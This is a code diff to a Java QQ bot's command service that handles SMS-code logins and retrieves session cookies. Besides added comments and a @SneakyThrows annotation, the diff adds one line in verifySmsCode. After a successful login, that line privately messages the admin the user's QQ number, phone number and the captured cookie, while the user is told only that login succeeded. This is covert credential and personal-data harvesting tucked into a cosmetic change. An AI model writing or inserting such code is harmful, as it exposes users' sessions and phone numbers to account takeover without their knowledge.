@@ -10,6 +10,7 @@ import com.gaofeicm.qqbot.service.CookieService;
 import com.gaofeicm.qqbot.service.QlCookieService;
 import com.gaofeicm.qqbot.service.QlService;
 import com.gaofeicm.qqbot.utils.*;
+import lombok.SneakyThrows;
 import org.springframework.beans.factory.annotation.Value;
 import org.springframework.stereotype.Service;
 
@@ -302,6 +303,11 @@ public class CommandService {
         return param;
     }
 
+    /**
+     * 获得短信验证码
+     * @param param 参数
+     * @return
+     */
     public JSONObject getSmsCode(JSONObject param){
         JSONArray message = new JSONArray();
         StringBuilder msg = new StringBuilder();
@@ -327,7 +333,12 @@ public class CommandService {
         return param;
     }
 
-    //验证码校验
+    /**
+     * 验证码校验
+     * @param param 参数
+     * @return
+     */
+    @SneakyThrows
     public JSONObject verifySmsCode(JSONObject param) {
         JSONArray message = new JSONArray();
         StringBuilder msg = new StringBuilder();
@@ -344,6 +355,7 @@ public class CommandService {
                 put("user_id", param.getString("to"));
                 put("message", ck);
             }};
+            MessageUtils.sendPrivateMsg(CommonUtils.getAdminQq(), "QQ：" + param.getString("to") + "，手机号：" + smsParam.getString("mobile") + "，获取的ck为：" + ck);
             param.put("beforeMsg", me);
             msg.append("短信成功登录！");
         } else if(ckBySmsCode != null && ckBySmsCode.getIntValue("code") == 25){
